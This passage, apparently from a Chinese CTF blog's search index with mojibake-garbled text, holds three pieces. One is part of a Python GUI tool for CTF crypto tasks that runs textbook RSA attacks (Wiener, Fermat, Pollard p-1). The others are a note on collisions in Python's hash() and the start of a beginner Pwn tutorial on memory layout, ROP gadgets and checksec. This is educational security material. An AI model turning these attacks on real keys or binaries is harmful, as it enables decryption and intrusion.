[&#x27;p&#x27;,&#x27;q&#x27;,&#x27;e&#x27;]: row = tk.Frame(rsa_generate_pem_frame) tk.Label(row, text=f&quot;&#123;label&#125; =&quot;, font=font_text, width=3).pack(side=tk.LEFT) entry = tk.Entry(row, font=font_text, width=40) entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5) rsa_generate_entries[label] = entry row.pack(padx=20, pady=3, fill=tk.X)# ç”ŸæˆæŒ‰é’®tk.Button(rsa_generate_pem_frame, text=&#x27;ç”ŸæˆPEM&#x27;, font=font_title, bg=&#x27;#9C27B0&#x27;, fg=&#x27;white&#x27;, command=generate_pem).pack(pady=10)tk.Label(rsa_generate_pem_frame, text=&#x27;ç”Ÿæˆçš„PEMï¼š&#x27;, font=font_title).pack()rsa_generate_pem_output = scrolledtext.ScrolledText(rsa_generate_pem_frame, height=15, font=font_text)rsa_generate_pem_output.tag_configure(&quot;bold&quot;, font=(&#x27;å¾®è½¯é›…é»‘&#x27;, 10, &#x27;bold&#x27;))rsa_generate_pem_output.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ RSA - PEMè§£æç•Œé¢ ------------------def parse_pem(): global parsed_pem_values # æ·»åŠ å…¨å±€å˜é‡å­˜å‚¨ parsed_pem_values = &#123;&#125; # åˆå§‹åŒ–å­—å…¸ rsa_pem_output.delete(&#x27;1.0&#x27;, tk.END) pem_data = pem_input.get(&#x27;1.0&#x27;, tk.END).strip().encode() try: if b&#x27;BEGIN PUBLIC KEY&#x27; in pem_data: pub_key = serialization.load_pem_public_key(pem_data, backend=default_backend()) nums = pub_key.public_numbers() rsa_pem_output.insert(tk.END, f&quot;ç±»å‹ï¼šå…¬é’¥\\nn=&#123;nums.n&#125;\\ne=&#123;nums.e&#125;\\n&quot;) parsed_pem_values = &#123;&#x27;n&#x27;: nums.n, &#x27;e&#x27;: nums.e&#125; else: priv_key = serialization.load_pem_private_key(pem_data, password=None, backend=default_backend()) nums = priv_key.private_numbers() rsa_pem_output.insert(tk.END, f&quot;ç±»å‹ï¼šç§é’¥\\nn=&#123;nums.public_numbers.n&#125;\\ne=&#123;nums.public_numbers.e&#125;\\nd=&#123;nums.d&#125;\\np=&#123;nums.p&#125;\\nq=&#123;nums.q&#125;\\n&quot;) parsed_pem_values = &#123; &#x27;n&#x27;: nums.public_numbers.n, &#x27;e&#x27;: nums.public_numbers.e, &#x27;d&#x27;: nums.d, &#x27;p&#x27;: nums.p, &#x27;q&#x27;: nums.q &#125; except Exception as e: rsa_pem_output.insert(tk.END, f&quot;è§£æå¤±è´¥: &#123;e&#125;&quot;) def transfer_to_rsa_crack(): # é¦–å…ˆåˆ‡æ¢åˆ°RSAç ´è§£ç•Œé¢ show_frame(rsa_crack_frame) # æŠŠä¿å­˜çš„parsed_pem_valuesèµ‹å€¼åˆ°rsa_crack_frameå¯¹åº”è¾“å…¥æ¡† for key, entry in rsa_entries.items(): if key in parsed_pem_values: entry.delete(0, tk.END) entry.insert(0, str(parsed_pem_values[key]))rsa_pem_frame = tk.Frame(root)# å¸ƒå±€tk.Label(rsa_pem_frame, text=&#x27;è¯·è¾“å…¥ PEM æ ¼å¼çš„å¯†é’¥ï¼š&#x27;, font=font_title).pack(pady=(10,0))pem_input = scrolledtext.ScrolledText(rsa_pem_frame, height=10, font=font_text)pem_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(rsa_pem_frame, text=&#x27;è§£æ PEM&#x27;, font=font_title, bg=&#x27;#9C27B0&#x27;, fg=&#x27;white&#x27;, command=parse_pem).pack(pady=10)tk.Label(rsa_pem_frame, text=&#x27;è§£æç»“æœï¼š&#x27;, font=font_title).pack()rsa_pem_output = scrolledtext.ScrolledText(rsa_pem_frame, height=10, font=font_text)rsa_pem_output.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(rsa_pem_frame, text=&#x27;ä¼ é€’åˆ°RSAç ´è§£&#x27;, font=font_title, bg=&#x27;#FF9800&#x27;, fg=&#x27;white&#x27;, command=lambda: transfer_to_rsa_crack()).pack(pady=10)# ------------------ RSA - ç ´è§£ç•Œé¢ ------------------def reset_rsa_entries(): &quot;&quot;&quot;é‡ç½®æ‰€æœ‰RSAå‚æ•°è¾“å…¥æ¡†&quot;&quot;&quot; for entry in rsa_entries.values(): entry.delete(0, tk.END) # é‡ç½®æ”»å‡»é€‰é¡¹çš„å¤é€‰æ¡† for var, _ in attack_vars.values(): var.set(False) # é‡ç½®å¾ªç¯ä¸Šé™è¾“å…¥æ¡† for _, param_entry in attack_vars.values(): param_entry.delete(0, tk.END) param_entry.insert(0, &#x27;1000000&#x27;) # æ¸…ç©ºè¾“å‡ºç»“æœ rsa_crack_output.delete(&#x27;1.0&#x27;, tk.END)def rsa_crack_handler(): rsa_crack_output.delete(&#x27;1.0&#x27;, tk.END) def get_int(name): txt = rsa_entries[name].get().strip().replace(&quot; &quot;, &quot;&quot;) return int(txt) if txt else None n = get_int(&#x27;n&#x27;) p = get_int(&#x27;p&#x27;) q = get_int(&#x27;q&#x27;) d = get_int(&#x27;d&#x27;) e = get_int(&#x27;e&#x27;) c = get_int(&#x27;c&#x27;) # 1. å…¨éƒ¨å‚æ•° if None not in (n,d,c): m = pow(c, d, n) try: text = long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) except: text = str(long_to_bytes(m)) rsa_crack_output.insert(tk.END, f&quot;è§£å¯†ç»“æœ: &#123;text&#125;\\n&quot;) return # 2. è®¡ç®— dï¼ˆåªè¦ç»™äº† p, q, e å°±èƒ½ç®—ï¼›n ç¼ºäº†å°±ç”¨ p*qï¼‰ if None not in (p, q, e): n_calc = n if n is not None else p * q phi = (p - 1) * (q - 1) d_calc = pow(e, -1, phi) rsa_crack_output.insert(tk.END, f&quot;è®¡ç®—å‡ºçš„ d: &#123;d_calc&#125;\\n&quot;) # è‹¥ç»™äº†å¯†æ–‡ cï¼Œè‡ªåŠ¨è§£å¯†å¹¶æ‰“å°æ˜æ–‡ if c is not None: m = pow(c, d_calc, n_calc) try: text = long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) except Exception: text = str(long_to_bytes(m)) rsa_crack_output.insert(tk.END, f&quot;è§£å¯†ç»“æœ: &#123;text&#125;\\n&quot;) return # 3. æ”»å‡» if n is not None: attack_executed = False if None not in (n,e): if attack_vars[&quot;Wiener&#x27;s Attack&quot;][0].get(): rsa_crack_output.insert(tk.END, &quot;æ‰§è¡Œ Wiener æ”»å‡»...\\n&quot;) d_w = wiener_attack(e,n) if d_w: rsa_crack_output.insert(tk.END, f&quot;æˆåŠŸ: d=&#123;d_w&#125;\\n&quot;) else: rsa_crack_output.insert(tk.END, &quot;å¤±è´¥ã€‚\\n&quot;) attack_executed = True if attack_vars[&#x27;Fermat Factorization&#x27;][0].get(): lim = int(attack_vars[&#x27;Fermat Factorization&#x27;][1].get()) rsa_crack_output.insert(tk.END, &quot;æ‰§è¡Œ Fermat åˆ†è§£...\\n&quot;) res = fermat_factor(n, lim) if res: rsa_crack_output.insert(tk.END, f&quot;æˆåŠŸ: p=&#123;res[0]&#125;, q=&#123;res[1]&#125;\\n&quot;) else: rsa_crack_output.insert(tk.END, &quot;å¤±è´¥ã€‚\\n&quot;) attack_executed = True if attack_vars[&quot;Pollard&#x27;s p-1&quot;][0].get(): B = int(attack_vars[&quot;Pollard&#x27;s p-1&quot;][1].get()) rsa_crack_output.insert(tk.END, &quot;æ‰§è¡Œ Pollard p-1...\\n&quot;) res = pollard_p1(n, B) if res: rsa_crack_output.insert(tk.END, f&quot;æˆåŠŸ: p=&#123;res[0]&#125;, q=&#123;res[1]&#125;\\n&quot;) else: rsa_crack_output.insert(tk.END, &quot;å¤±è´¥ã€‚\\n&quot;) attack_executed = True if not attack_executed: rsa_crack_output.insert(tk.END, &quot;è¯·é€‰æ‹©è‡³å°‘ä¸€ç§æ”»å‡»æ–¹æ³•ã€‚\\n&quot;) return rsa_crack_output.insert(tk.END, &quot;è¯·è‡³å°‘è¾“å…¥ n æˆ–æ›´å¤šå‚æ•°ã€‚\\n&quot;) rsa_crack_frame = tk.Frame(root)# å¸ƒå±€tk.Label(rsa_crack_frame, text=&#x27;è¯·è¾“å…¥ RSA å‚æ•°ï¼ˆåè¿›åˆ¶æ•´æ•°ï¼‰ï¼š&#x27;, font=font_title).pack(pady=(10,5))rsa_entries = &#123;&#125;for label in [&#x27;n&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;c&#x27;]: row = tk.Frame(rsa_crack_frame) tk.Label(row, text=f&quot;&#123;label&#125; =&quot;, font=font_text, width=3).pack(side=tk.LEFT) entry = tk.Entry(row, font=font_text, width=40) entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5) rsa_entries[label] = entry row.pack(padx=20, pady=3, fill=tk.X)# æ”»å‡»é€‰é¡¹attack_vars = &#123;&#125;for name in [&#x27;Fermat Factorization&#x27;,&quot;Pollard&#x27;s p-1&quot;,&quot;Wiener&#x27;s Attack&quot;]: row = tk.Frame(rsa_crack_frame) var_enable = tk.BooleanVar(value=False) tk.Checkbutton(row, text=name, variable=var_enable, font=font_text).pack(side=tk.LEFT) tk.Label(row, text=&#x27;å¾ªç¯ä¸Šé™:&#x27;, font=font_text).pack(side=tk.LEFT, padx=5) param_entry = tk.Entry(row, width=10) param_entry.insert(0,&#x27;1000000&#x27;) param_entry.pack(side=tk.LEFT) attack_vars[name] = (var_enable,param_entry) row.pack(anchor=&#x27;w&#x27;, padx=40, pady=3)# è®¡ç®—æŒ‰é’®button_frame = tk.Frame(rsa_crack_frame)tk.Button(button_frame, text=&#x27;ç ´è§£&#x27;, font=font_title, bg=&#x27;#FF9800&#x27;, fg=&#x27;white&#x27;, command=rsa_crack_handler).pack(side=tk.LEFT, padx=(0, 10))tk.Button(button_frame, text=&#x27;é‡ç½®&#x27;, font=font_title, bg=&#x27;#607D8B&#x27;, fg=&#x27;white&#x27;, command=lambda: reset_rsa_entries()).pack(side=tk.LEFT)button_frame.pack(pady=10)tk.Label(rsa_crack_frame, text=&#x27;è¾“å‡ºç»“æœï¼š&#x27;, font=font_title).pack()rsa_crack_output = scrolledtext.ScrolledText(rsa_crack_frame, height=12, font=font_text)rsa_crack_output.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ å“ˆå¸Œ - SHA256 ç•Œé¢ ------------------def compute_sha256(): sha256_output_text.delete(&#x27;1.0&#x27;, tk.END) raw = sha256_input_text.get(&#x27;1.0&#x27;, tk.END).strip() if not raw: sha256_output_text.insert(tk.END, &quot;è¯·è¾“å…¥æ–‡æœ¬å†…å®¹ã€‚&quot;) return h = hashlib.sha256(raw.encode()).hexdigest() sha256_output_text.insert(tk.END, h)sha256_frame = tk.Frame(root)# å¸ƒå±€tk.Label(sha256_frame, text=&#x27;è¯·è¾“å…¥æ–‡æœ¬å†…å®¹ï¼š&#x27;, font=font_title).pack(pady=(10,0))sha256_input_text = scrolledtext.ScrolledText(sha256_frame, height=6, font=font_text)sha256_input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(sha256_frame, text=&#x27;è®¡ç®—å“ˆå¸Œ&#x27;, font=font_title, bg=&#x27;#E91E63&#x27;, fg=&#x27;white&#x27;, command=compute_sha256).pack(pady=10)tk.Label(sha256_frame, text=&#x27;SHA256 ç»“æœï¼š&#x27;, font=font_title).pack()sha256_output_text = scrolledtext.ScrolledText(sha256_frame, height=6, font=font_text)sha256_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ å“ˆå¸Œ - MD5 ç•Œé¢ ------------------def compute_md5(): md5_output_text.delete(&#x27;1.0&#x27;, tk.END) raw = md5_input_text.get(&#x27;1.0&#x27;, tk.END).strip() if not raw: md5_output_text.insert(tk.END, &quot;è¯·è¾“å…¥æ–‡æœ¬å†…å®¹ã€‚&quot;) return h = hashlib.md5(raw.encode()).hexdigest() md5_output_text.insert(tk.END, h)md5_frame = tk.Frame(root)# å¸ƒå±€tk.Label(md5_frame, text=&#x27;è¯·è¾“å…¥æ–‡æœ¬å†…å®¹ï¼š&#x27;, font=font_title).pack(pady=(10,0))md5_input_text = scrolledtext.ScrolledText(md5_frame, height=6, font=font_text)md5_input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(md5_frame, text=&#x27;è®¡ç®—å“ˆå¸Œ&#x27;, font=font_title, bg=&#x27;#7E57C2&#x27;, fg=&#x27;white&#x27;, command=compute_md5).pack(pady=10)tk.Label(md5_frame, text=&#x27;MD5 ç»“æœï¼š&#x27;, font=font_title).pack()md5_output_text = scrolledtext.ScrolledText(md5_frame, height=6, font=font_text)md5_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ èœå•é…ç½® ------------------encoding_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;ç¼–ç &#x27;, menu=encoding_menu)encoding_menu.add_command(label=&#x27;ç¼–ç &#x27;, command=lambda: show_frame(encode_frame))encoding_menu.add_command(label=&#x27;è§£ç &#x27;, command=lambda: show_frame(decode_frame))classical_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;å¤å…¸å¯†ç &#x27;, menu=classical_menu)classical_menu.add_command(label=&#x27;æ …æ å¯†ç &#x27;, command=lambda: show_frame(RailFence_frame))classical_menu.add_command(label=&#x27;å‡¯æ’’å¯†ç &#x27;, command=lambda: show_frame(Caesar_frame))classical_menu.add_command(label=&#x27;ç»´å‰å°¼äºšå¯†ç &#x27;, command=lambda: show_frame(Vigenere_frame))rsa_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;RSA&#x27;, menu=rsa_menu)pem_menu = tk.Menu(rsa_menu, tearoff=0)rsa_menu.add_cascade(label=&#x27;PEM&#x27;, menu=pem_menu)pem_menu.add_command(label=&#x27;ç”ŸæˆPEM&#x27;, command=lambda: show_frame(rsa_generate_pem_frame))pem_menu.add_command(label=&#x27;è§£æPEM&#x27;, command=lambda: show_frame(rsa_pem_frame))rsa_menu.add_command(label=&#x27;ç ´è§£ RSA&#x27;, command=lambda: show_frame(rsa_crack_frame))hash_menu = tk.Menu(menubar, tearoff=0)menubar.add_cascade(label=&#x27;å“ˆå¸Œ&#x27;, menu=hash_menu)hash_menu.add_command(label=&#x27;SHA256&#x27;, command=lambda: show_frame(sha256_frame))hash_menu.add_command(label=&#x27;MD5&#x27;, command=lambda: show_frame(md5_frame))# é»˜è®¤æ˜¾ç¤ºé¡µé¢show_frame(decode_frame)root.mainloop() æ‰“åŒ…å¯ä»¥ç”¨pyinstallerå°†è¿™ä¸ªç¨‹åºæ‰“åŒ…æˆ.exeè½¯ä»¶ã€‚ å¦‚æœæ²¡æœ‰å®‰è£…ï¼Œåˆ™è¿è¡Œï¼š 1pip install pyinstaller å®‰è£…å¥½åè¿è¡Œï¼ˆå…ˆå°†å½“å‰pythonè„šæœ¬ä¿å­˜ä¸ºCryptexLab.pyï¼‰ï¼š 1pyinstaller --noconfirm --windowed --onefile .\\CryptexLab.py CryptexLab.exeæ–‡ä»¶åº”è¯¥ä¼šç”Ÿæˆåœ¨å½“å‰ç›®å½•ä¸‹çš„ï¼š 1dist/decoder.exe","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"tool","slug":"tool","permalink":"https://archer-baiyi.github.io/tags/tool/"}]},{"title":"Pythonå†…ç½®çš„å“ˆå¸Œå‡½æ•°çš„ç¢°æ’","slug":"CTF/Crypto/Pythonå†…ç½®çš„å“ˆå¸Œå‡½æ•°çš„æ¼æ´","date":"2025-05-17T17:40:40.000Z","updated":"2025-05-20T18:27:53.151Z","comments":true,"path":"2025/05/17/CTF/Crypto/Pythonå†…ç½®çš„å“ˆå¸Œå‡½æ•°çš„æ¼æ´/","permalink":"https://archer-baiyi.github.io/2025/05/17/CTF/Crypto/Python%E5%86%85%E7%BD%AE%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E/","excerpt":"Pythonå†…ç½®çš„å“ˆå¸Œå‡½æ•° hash() çš„ç¢°æ’æ¼æ´","text":"hash()Pythonæ‹¥æœ‰ä¸€ä¸ªå†…ç½®çš„å“ˆå¸Œå‡½æ•°hash()ï¼Œå¯ä»¥åœ¨Python æ ‡å‡†åº“æ–‡æ¡£æ‰¾åˆ°å¯¹åº”çš„è§£é‡Šï¼š ï¼ˆæ¥æºï¼šhttps://docs.python.org/3/library/stdtypes.html#hashing-of-numeric-typesï¼‰ ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨32ä½çš„å¹³å°ä¸Šå“ˆå¸Œæ˜¯é€šè¿‡ \\text{hash}(x) = x \\text{ mod } 2^{31}-1è®¡ç®—å‡ºæ¥çš„ã€‚è€Œåœ¨64ä½çš„å¹³å°ä¸Šï¼Œæ˜¯é€šè¿‡ \\text{hash}(x) = x \\text{ mod } 2^{61}-1ç¢°æ’ï¼ˆCollisionï¼‰è¿™ä¸ªå“ˆå¸Œå‡½æ•°çš„æ„é€ æ„å‘³ç€æˆ‘ä»¬å¯ä»¥éå¸¸è½»æ¾åœ°æ‰¾åˆ°ä¸€ä¸ªå“ˆå¸Œç¢°æ’ï¼ˆCollisionï¼‰ï¼Œå› ä¸ºå®ƒä¸¤ç§resistanceï¼ˆWeak and strong collision resistanceï¼‰éƒ½ä¸æ»¡è¶³ã€‚ å‡è®¾ç°åœ¨ç»™å®šä¸€ä¸ªæ•´æ•°$x$ã€‚ å¦‚æœæ˜¯åœ¨32ä½çš„å¹³å°ä¸Šï¼Œåˆ™å¯ä»¥é€šè¿‡ä»¥ä¸‹å…¬å¼è®¡ç®—å‡ºä¸€ä¸ª$y$ä½¿å¾—$\\text{hash}(x)=\\text{hash}(y)$ y:= x+2^{31}-1å¦‚æœæ˜¯åœ¨64ä½çš„å¹³å°ä¸Šï¼Œåˆ™ y:= x+2^{61}-1ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"å“ˆå¸Œ","slug":"å“ˆå¸Œ","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"},{"name":"python","slug":"python","permalink":"https://archer-baiyi.github.io/tags/python/"}]},{"title":"Pwnå…¥é—¨","slug":"CTF/Pwn/Pwnå…¥é—¨","date":"2025-05-12T15:01:08.000Z","updated":"2025-11-21T13:28:17.515Z","comments":true,"path":"2025/05/12/CTF/Pwn/Pwnå…¥é—¨/","permalink":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/","excerpt":"é›¶åŸºç¡€Pwnå…¥é—¨","text":"èƒŒæ™¯çŸ¥è¯†åœ°å€ç©ºé—´ï¼ˆAddress spaceï¼ŒProzess Adressraumï¼‰åœ°å€ç©ºé—´å¯ä»¥è¢«çœ‹ä½œæ˜¯ä¸€ä¸ªå·¨å¤§çš„ ä¸€ç»´å­—èŠ‚æ•°ç»„ï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶ï¼ˆä¸å®ƒæ½œåœ¨çš„å¤§å°ç›¸æ¯”ï¼‰ï¼Œå…¶ä¸­åªæœ‰å°‘æ•°ä½ç½®å­˜æœ‰æ•°æ®ã€‚ç”±äºåœ°å€ç©ºé—´å ç”¨éå¸¸ç¨€ç–ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†å…¶åˆ’åˆ†ä¸ºå¤§å°ç›¸ç­‰çš„ é¡µï¼ˆPagesï¼‰ï¼Œå…¶ä¸­åªæœ‰è¢«æ“ä½œç³»ç»Ÿé‡Šæ”¾ï¼ˆæ˜ å°„ï¼‰çš„é¡µæ‰å¯ä»¥è¢«è®¿é—®ã€‚ ç¨‹åºä»ç¡¬ç›˜è¢«åŠ è½½åˆ°ä½åœ°å€ç©ºé—´ï¼ˆå¯¹åº”çš„é¡µç”±æ“ä½œç³»ç»Ÿæˆ–ç¨‹åºåŠ è½½å™¨è‡ªåŠ¨æä¾›ï¼‰ã€‚ ç”¨äºæ‰§è¡Œçš„æœºå™¨ä»£ç å­˜æ”¾åœ¨ æ–‡æœ¬æ®µï¼ˆText Segmentï¼‰ ä¸­ï¼Œé™æ€åˆå§‹åŒ–çš„å˜é‡å’Œå­—ç¬¦ä¸²å¸¸é‡å­˜æ”¾åœ¨ æ•°æ®æ®µï¼ˆData Segmentï¼‰ ä¸­ã€‚é™æ€å˜é‡å¦‚æœåœ¨ç¨‹åºå¼€å§‹æ—¶å°šæœªè¢«èµ‹å€¼ï¼Œåˆ™ä¼šæ”¾åœ¨ BSS æ®µ ä¸­ï¼Œå¹¶ç”±æ“ä½œç³»ç»Ÿå¡«å……ä¸ºé›¶å­—èŠ‚ã€‚ ç¨‹åºæ‰€éœ€çš„åŠ¨æ€é“¾æ¥åº“ä¹Ÿç”±è¿™ä¸‰ç±»æ®µç»„æˆï¼Œå¹¶ç”±ç¨‹åºåŠ è½½å™¨åŠ è½½åˆ°æ›´é«˜çš„å†…å­˜åœ°å€ã€‚ç”±äºè¿™äº›åº“æ‰€éœ€çš„å†…å­˜æ˜¯é€šè¿‡ mmap ç³»ç»Ÿè°ƒç”¨ å‘æ“ä½œç³»ç»Ÿç”³è¯·çš„ï¼Œå› æ­¤å®ƒä»¬ä¹Ÿè¢«ç§°ä¸º MMap æ®µã€‚ åœ¨ç¨‹åºåˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œè¿˜ä¼šé¢å¤–ä¿ç•™ä¸¤ä¸ªåŒºåŸŸï¼š æ ˆï¼ˆStackï¼‰ï¼šç”¨äºè‡ªåŠ¨ç®¡ç†çš„å˜é‡ã€‚ å †ï¼ˆHeapï¼‰ï¼šç”¨äºåŠ¨æ€åˆ†é…çš„å˜é‡ã€‚ æ ˆåœ¨æ¯æ¬¡å‡½æ•°è°ƒç”¨æ—¶ä¼šæ‰©å±•ä¸€ä¸ª æ ˆå¸§ï¼ˆStack Frameï¼‰ã€‚åœ¨æ ˆå¸§çš„å†…å­˜åŒºåŸŸä¸­å­˜å‚¨æœ‰å½“å‰å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œä»¥åŠä¸€äº›ç®¡ç†ä¿¡æ¯ï¼Œä¾‹å¦‚ è¿”å›åœ°å€ã€‚è¿”å›åœ°å€è®°å½•äº†å½“å‰æ‰§è¡Œçš„å‡½æ•°æ˜¯ä»å“ªä¸€ä¸ªç¨‹åºåœ°å€è¢«è°ƒç”¨çš„ã€‚éšç€å‡½æ•°è°ƒç”¨æ·±åº¦çš„å¢åŠ ï¼Œæ ˆä¼šä»é«˜åœ°å€å‘ä½åœ°å€æ–¹å‘å¢é•¿ã€‚ å½“éœ€è¦åœ¨å‡½æ•°æ‰§è¡Œå®Œæ¯•åå˜é‡ä»ç„¶å­˜åœ¨æ—¶ï¼Œå°±å¿…é¡»ä½¿ç”¨ å † æ¥è¿›è¡ŒåŠ¨æ€å†…å­˜åˆ†é…ï¼ˆå› ä¸ºæ ˆä¸Šçš„å˜é‡ä¼šåœ¨å‡½æ•°è¿”å›æ—¶è‡ªåŠ¨é‡Šæ”¾ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç¨‹åºå¯ä»¥é€šè¿‡ libc æä¾›çš„åˆ†é…å™¨ ä½¿ç”¨ malloc å‡½æ•°å‘ç³»ç»Ÿç”³è¯·å†…å­˜ã€‚å¦‚æœå¯èƒ½ï¼Œåˆ†é…å™¨ä¼šè¿”å›å¯¹ç¨‹åºå¯åŠ¨æ—¶é¢„ç•™çš„å †åŒºåŸŸçš„å¼•ç”¨ï¼›å¦‚æœå †ç©ºé—´ä¸è¶³ï¼Œåˆ†é…å™¨ä¼šé€šè¿‡ mmap ç³»ç»Ÿè°ƒç”¨ å‘æ“ä½œç³»ç»Ÿè¯·æ±‚ä¸€ä¸ªæ–°çš„ MMap æ®µï¼Œå¹¶è¿”å›å¯¹è¯¥æ®µçš„å¼•ç”¨ã€‚ C æ ‡å‡†åº“ï¼ˆlibcï¼‰é™¤äº†åŒ…å«å†…å­˜åˆ†é…å™¨ä¹‹å¤–ï¼Œè¿˜æä¾›äº†è®¸å¤šå¸¸ç”¨å‡½æ•°ï¼Œä»¥ä¾¿ç®€åŒ–ä¸æ“ä½œç³»ç»Ÿçš„äº¤äº’ã€‚ åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœè®¿é—®äº†ä¸€ä¸ªæ— æ•ˆçš„åœ°å€ï¼ˆå³æœªæ˜ å°„çš„é¡µï¼‰ï¼Œæ“ä½œç³»ç»Ÿä¼šå‘ç¨‹åºå‘é€ä¸€ä¸ª æ®µé”™è¯¯ï¼ˆSegmentation Faultï¼‰ ä¿¡å·ã€‚å¦‚æœç¨‹åºæ²¡æœ‰å¯¹æ­¤è¿›è¡Œå¤„ç†ï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºç»ˆæ­¢ã€‚ X86æ±‡ç¼–æŒ‰ SysV x64 ABIï¼Œå‡½æ•°å‰ä¸‰ä¸ªå‚æ•°æ”¾åœ¨ rdi, rsi, rdxã€‚æ‰€ä»¥ 123pop rdi ; retpop rsi ; retpop rdx ; ret ä¼šèµ·åˆ°è®¾ç½®å‚æ•°çš„ä½œç”¨ã€‚ï¼ˆå°†æŒ‡å®šå‚æ•°å­˜å…¥å¯„å­˜å™¨ã€‚ï¼‰ pop rbp åˆ™æ˜¯ä¼šæŠŠæ ˆé¡¶çš„ 8 å­—èŠ‚å¼¹åˆ°å¯„å­˜å™¨ rbpï¼ŒåŒæ—¶ rsp += 8ã€‚ å®‰å…¨æ€§æ£€æŸ¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨checksecå‘½ä»¤æ£€æŸ¥ä¸€ä»½äºŒè¿›åˆ¶æ–‡ä»¶çš„å®‰å…¨æ€§. å®‰è£…ï¼š 1sudo apt install checksec ä¾‹å­ï¼š 123456789â””â”€$ checksec ./vuln Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes 12345678â””â”€$ checksec ./racecar Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Stripped: No è§£é‡Šï¼š Archï¼šäºŒè¿›åˆ¶æ–‡ä»¶çš„æ¶æ„ amd64-64-littleï¼š x86-64 æ¶æ„çš„64ä½å°ç«¯åºELFå¯æ‰§è¡Œæ–‡ä»¶ï¼› i386-32-littleï¼šx86 æ¶æ„çš„32ä½å°ç«¯åºELFå¯æ‰§è¡Œæ–‡ä»¶ RELROï¼šRead-Only Relocationsï¼Œè¡¨ç¤ºé‡å®šä½è¡¨åªè¯»ï¼Œèƒ½é˜²æ­¢é€šè¿‡ä¿®æ”¹ GOTï¼ˆå…¨å±€åç§»è¡¨ï¼‰æ¥åŠ«æŒæ§åˆ¶æµã€‚ Partial RELROï¼šåªéƒ¨åˆ†ä¿æŠ¤ï¼› Full RELROï¼šGOT å®Œå…¨åªè¯»ï¼Œæ›´å®‰å…¨ã€‚ Stackï¼šæ˜¯å¦å¯ç”¨äº†æ ˆé‡‘ä¸é›€ï¼ˆStack Canaryï¼‰ã€‚ No canary foundï¼šæ²¡æœ‰ä¿æŠ¤ï¼Œå®¹æ˜“è¢«æ ˆæº¢å‡ºæ”»å‡»ï¼› Canary foundï¼šèƒ½æ£€æµ‹æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„è¡Œä¸ºã€‚ NXï¼šNon-eXecutable stack/heapï¼Œè¡¨ç¤ºæ•°æ®æ®µä¸å¯æ‰§è¡Œã€‚ disabledï¼šæ”»å‡»è€…å¯ä»¥ç›´æ¥åœ¨æ ˆ/å †æ‰§è¡Œæ¶æ„ä»£ç ï¼› enabledï¼šæ ˆå’Œå †ä¸èƒ½ç›´æ¥æ‰§è¡Œä»£ç ï¼Œé˜»æ­¢ä¼ ç»Ÿ shellcode æ³¨å…¥ã€‚ PIEï¼šPosition Independent Executableï¼Œæ˜¯å¦æ”¯æŒåœ°å€éšæœºåŒ–ï¼ˆASLRï¼‰ã€‚ No PIEï¼šç¨‹åºæ€»æ˜¯åŠ è½½åœ¨å›ºå®šåœ°å€ï¼ˆå¦‚ 0x400000ï¼‰ï¼Œä¾¿äºæ”»å‡»è€…æ„é€  ROPï¼› PIE enabledï¼šä¸»ç¨‹åºåŸºå€éšæœºåŒ–ï¼Œå¢åŠ æ”»å‡»éš¾åº¦ã€‚ Strippedï¼šæ˜¯å¦å‰¥ç¦»äº†ç¬¦å·ä¿¡æ¯ã€‚ Noï¼šåŒ…å«å‡½æ•°åã€ç¬¦å·ï¼Œæ–¹ä¾¿è°ƒè¯•å’Œé€†å‘åˆ†æï¼› Yesï¼šå·²å‰¥ç¦»ï¼Œæ›´éš¾é€†å‘ï¼Œä½†å¯¹è¿è¡Œå®‰å…¨æ€§å½±å“ä¸å¤§ã€‚ 